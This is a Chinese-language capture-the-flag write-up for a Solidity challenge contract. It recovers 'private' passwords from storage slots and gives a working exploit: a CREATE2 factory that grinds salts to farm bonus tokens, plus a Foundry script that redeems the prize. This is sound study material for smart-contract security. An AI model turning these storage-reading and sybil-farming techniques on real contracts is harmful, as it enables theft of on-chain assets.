# moon

# 源码

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.9;

contract greedyBlueMoon {
    mapping(address => uint256) private shards; //0
    mapping(address => bool) public challenger; //1
    uint256 private paralysisRing; //2
    address owner; //3 uint160 20字节 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    uint80 private rates; //3 10字节
    uint8 private bonus; //3 1字节
    uint16 private price; //4 2字节
    uint8 private loot; //4 1字节
    bytes10 private password1; //4 10字节
    mapping(address => uint256) private attackingType; //5
    mapping(address => uint256) private waitTime; //6
    address chainaddr = address(this); //7
    uint256 private lol = 114; //8
    uint256 private L0L = 514; //9
    uint256 private Lo1 = 114514; //10
    bytes32[] private password2; //11
    uint16 public high2Prefix; //12

    constructor(
        uint256 _bonus,
        uint256 _price,
        uint256 _rates,
        uint256 _loot,
        bytes10 _password1,
        bytes8 _password2_1,
        bytes8 _password2_2,
        bytes8 _password2_3,
        bytes8 _password2_4
    ) {
        owner = msg.sender;
        bonus = uint8(_bonus);
        price = uint16(_price);
        rates = uint80(_rates);
        loot = uint8(_loot);
        password1 = _password1;
        password2.push(_password2_1); //0x0175b7a638427703f0dbe7bb9bbf987a2551717b34e79f33b5b1008d1fa01db9 0x8542365815820425000000000000000000000000000000000000000000000000 60274595836892880102263015710152418375603488291410874925448580322562196635648
        password2.push(_password2_2); //0x0175b7a638427703f0dbe7bb9bbf987a2551717b34e79f33b5b1008d1fa01dba 0x9825367458436215000000000000000000000000000000000000000000000000 68817302157005032812774228469416427649423721787519004150499365819006161256448
        password2.push(_password2_3); //0x0175b7a638427703f0dbe7bb9bbf987a2551717b34e79f33b5b1008d1fa01dbb 0x9726841358563224000000000000000000000000000000000000000000000000 68367291876594506866871524762950999141942385624721284791047517844771134504960
        password2.push(_password2_4); //0x0175b7a638427703f0dbe7bb9bbf987a2551717b34e79f33b5b1008d1fa01dbc 0x6952148523852424000000000000000000000000000000000000000000000000 47637872184895342147211396033760031840832789996261776040046097242120792309760
    }

    function transferOwnership(address newOwner) external {
        require(msg.sender != owner, "not owner");
        require(newOwner != address(0), "zero address");
        owner = newOwner;
    }

    function newchallengerBundle() public {
        uint16 high2 = uint16(uint160(msg.sender) >> 144);
        require(challenger[msg.sender] == false, "already claimed");
        require(high2 >= high2Prefix, "Invalid address");
        shards[msg.sender] += bonus;
        challenger[msg.sender] = true;
        high2Prefix += 64;
    }

    function buyShards() public payable {
        uint256 yourMoney = msg.value / rates;
        shards[msg.sender] += yourMoney;
    }

    function fightMob() public {
        waitTime[msg.sender] = block.timestamp + 1 minutes;
        attackingType[msg.sender] = 1;
    }

    function collectingMobLoot() public {
        require((waitTime[msg.sender] < block.timestamp), "Mob is alive");
        require(attackingType[msg.sender] == 1);
        attackingType[msg.sender] = 0;
        shards[msg.sender] += 10;
    }

    function fightBoss() public {
        waitTime[msg.sender] = block.timestamp + 52 weeks;
        attackingType[msg.sender] = 2;
    }

    function collectingBossLoot() public {
        require((waitTime[msg.sender] < block.timestamp), "Boss is alive");
        require(attackingType[msg.sender] == 2);
        attackingType[msg.sender] = 0;
        paralysisRing += 1;
    }

    function transfersOfItems(address to, uint256 value) public {
        require(shards[msg.sender] >= value, "insufficient shards");
        require(msg.sender != to, "don't transfer to yourself");
        shards[msg.sender] -= value;
        shards[to] += value;
    }

    function redeemingParalyzingRing(bytes10 _key1, bytes32 _key2) public {
        require((shards[msg.sender] >= price), "Please use the money power");
        require(
            (keccak256(abi.encodePacked(password1)) ==
                keccak256(abi.encodePacked(_key1))),
            "Wrong Password1."
        );
        bytes32 password_2;
        bytes32 password_2_0 = password2[0];
        bytes32 password_2_1 = password2[1];
        bytes32 password_2_2 = password2[2];
        bytes32 password_2_3 = password2[3];
        password_2 =
            password_2_0 |
            (password_2_1 >> 64) |
            (password_2_2 >> 128) |
            (password_2_3 >> 192);
        require(
            (keccak256(abi.encodePacked(password_2)) ==
                keccak256(abi.encodePacked(_key2))),
            "Wrong Password2."
        );
        shards[msg.sender] -= price;
        paralysisRing += 1;
    }

    function isSolved() public view returns (bool) {
        require(paralysisRing >= 1);
        return true;
    }
}

```

# 读槽 chisel

有个很关键的点是变量打包存储，来看看源码的槽位分布

```solidity
    mapping(address => uint256) private shards; //0
    mapping(address => bool) public challenger; //1
    uint256 private paralysisRing; //2
    address owner; //3 uint160 20字节 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    uint80 private rates; //3 10字节
    uint8 private bonus; //3 1字节
    uint16 private price; //4 2字节
    uint8 private loot; //4 1字节
    bytes10 private password1; //4 10字节
    mapping(address => uint256) private attackingType; //5
    mapping(address => uint256) private waitTime; //6
    address chainaddr = address(this); //7
    uint256 private lol = 114; //8
    uint256 private L0L = 514; //9
    uint256 private Lo1 = 114514; //10
    bytes32[] private password2; //11
    uint16 public high2Prefix; //12
```

尤其注意slot4的那几个，key1就在其中

## password1

cast storage <地址> <槽位>，得到

```solidity
0x0000000000000000000000000000000000000072776562363636000000008f3a
```

`price`: 0x8f3a => 29303

`loot`: 0x00 => 0

`password1`： 72776562363636000000 => rweb666  作为第一个参数

## password2

```solidity
//0x0175b7a638427703f0dbe7bb9bbf987a2551717b34e79f33b5b1008d1fa01db9 0x8542365815820425000000000000000000000000000000000000000000000000 60274595836892880102263015710152418375603488291410874925448580322562196635648
//0x0175b7a638427703f0dbe7bb9bbf987a2551717b34e79f33b5b1008d1fa01dba 0x9825367458436215000000000000000000000000000000000000000000000000 68817302157005032812774228469416427649423721787519004150499365819006161256448
//0x0175b7a638427703f0dbe7bb9bbf987a2551717b34e79f33b5b1008d1fa01dbb 0x9726841358563224000000000000000000000000000000000000000000000000 68367291876594506866871524762950999141942385624721284791047517844771134504960
//0x0175b7a638427703f0dbe7bb9bbf987a2551717b34e79f33b5b1008d1fa01dbc 0x6952148523852424000000000000000000000000000000000000000000000000 47637872184895342147211396033760031840832789996261776040046097242120792309760
```

每行三串，依次是

* chisel先bytes4读出一个hash **每个的hash值都是上一个的hash+1**
* 然后`cast storage`这串值
* 最后`cast to-dec`

最后拼接在一起，`0x8542365815820425982536745843621597268413585632246952148523852424`作为第二个参数

# poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import {Attack} from "./Attack.sol";
import {greedyBlueMoon} from "./1.sol";

contract Factory {
    greedyBlueMoon moon =
        greedyBlueMoon(0x6253962a2310ae8AAd3eaFFC9de6BdA6C602Ff95);
    address public owner;
    uint256 public lastUsedSalt;

    function computeSalt(address target) public returns (bytes32) {
        for (uint256 i = lastUsedSalt + 1; i < 10000; i++) {
            bytes32 salt = bytes32(i);
            address predictedAddress = predictAddress(salt, target);
            if (
                (uint256(uint160(predictedAddress)) >> 144) >=
                moon.high2Prefix()
            ) {
                lastUsedSalt = i; //这个要格外注意一下,每次找到salt以后下一个就不要再重复了,从下一个开始找
                return salt;
            }
        }
        revert("No suitable salt found");
    }

    function predictAddress(
        bytes32 salt,
        address example
    ) public view returns (address) {
        bytes memory bytecode = abi.encodePacked(
            type(Attack).creationCode,
            abi.encode(example)
        );

        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this), // 部署者地址
                salt,
                keccak256(bytecode)
            )
        );
        return address(uint160(uint256(hash))); //预测的地址
    }

    function factory(
        bytes32 salt,
        address paekkoAddress
    ) public returns (address) {
        Attack a = new Attack{salt: salt}(paekkoAddress);
        return address(a);
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import {greedyBlueMoon} from "./1.sol";

contract Attack {
    greedyBlueMoon public moon;

    constructor(address addr) {
        moon = greedyBlueMoon(addr);
        moon.newchallengerBundle(); //领shard
        moon.transfersOfItems(0x98707a8Cb53bD823f9c5353611018aF38533adE5, 50); //把shard转给eoa
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import {Attack} from "../src/Attack.sol";
import {greedyBlueMoon} from "../src/1.sol";
import {Script} from "forge-std/Script.sol";
import {Factory} from "../src/Factory.sol";

contract Attacjsc is Script {
    function run() external {
        vm.startBroadcast();
        bytes32 salt;

        Factory factory = new Factory();
        greedyBlueMoon moon = greedyBlueMoon(
            0x6253962a2310ae8AAd3eaFFC9de6BdA6C602Ff95
        );
        for (uint i = 1; i <= 1000; i++) {
            salt = factory.computeSalt(address(moon));//找salt
            factory.factory(salt, address(moon));//用预测出的符合条件的地址去领shard并且转给eoa
        }

        moon.redeemingParalyzingRing(
            0x72776562363636000000,
            0x8542365815820425982536745843621597268413585632246952148523852424
        );
        require(moon.isSolved() == true, "you are not greedybluemoon");
        vm.stopBroadcast();
    }
}

```


> 更新: 2025-09-12 23:40:23  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/gt5a8tlk4c1h41ig>